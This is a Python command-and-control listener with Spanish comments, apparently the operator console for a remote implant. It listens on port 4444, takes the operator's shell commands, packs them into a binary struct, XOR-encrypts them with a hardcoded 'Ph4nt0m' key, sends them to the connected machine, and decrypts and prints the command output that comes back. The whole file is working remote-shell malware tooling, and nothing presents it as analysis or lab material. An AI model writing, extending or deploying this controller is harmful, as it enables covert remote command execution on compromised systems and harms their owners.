#!/usr/bin/env python3
import socket
import struct
import time
import random

HOST = '0.0.0.0'
PORT = 4444
KEY = b'Ph4nt0m_2024_!@#$'

def xor_crypt(data):
    """Aplica XOR con la clave definida"""
    return bytes([data[i] ^ KEY[i % len(KEY)] for i in range(len(data))])

def recv_exact(sock, n):
    """Recibe exactamente n bytes"""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Escuchando en {HOST}:{PORT}...")
    conn, addr = s.accept()
    print(f"[+] Conectado desde {addr}")

    while True:
        # Leer comando del operador
        cmd = input("cmd> ").strip()
        if cmd.lower() in ('exit', 'quit'):
            break

        # Construir paquete de comando: cmd_id aleatorio, tipo "shell", arg = cmd
        cmd_id = random.randint(1, 9999)
        cmd_type = b'shell'.ljust(16, b'\x00')
        arg = cmd.encode('utf-8').ljust(1024, b'\x00')
        packet = struct.pack('<I16s1024s', cmd_id, cmd_type, arg)

        # Encriptar y enviar
        enc = xor_crypt(packet)
        conn.sendall(enc)

        # Recibir respuesta (tamaño fijo de la estructura de respuesta)
        # Estructura: uint32_t resp_id + int status + size_t data_len + char data[4096]
        # En 64 bits: 4 + 4 + 8 + 4096 = 4112 bytes
        RESP_SIZE = 4 + 4 + 8 + 4096
        raw = recv_exact(conn, RESP_SIZE)
        if raw is None:
            print("[!] Conexión cerrada")
            break

        # Desencriptar
        dec = xor_crypt(raw)

        # Desempaquetar: <I (resp_id), i (status), Q (data_len), 4096s (data)
        resp_id, status, data_len, data = struct.unpack('<IiQ4096s', dec)
        # data es bytes de 4096, tomar solo los primeros data_len
        output = data[:data_len].decode('utf-8', errors='ignore')
        print(f"ID={resp_id} status={status}")
        print(output)

    conn.close()
    s.close()

if __name__ == '__main__':
    main()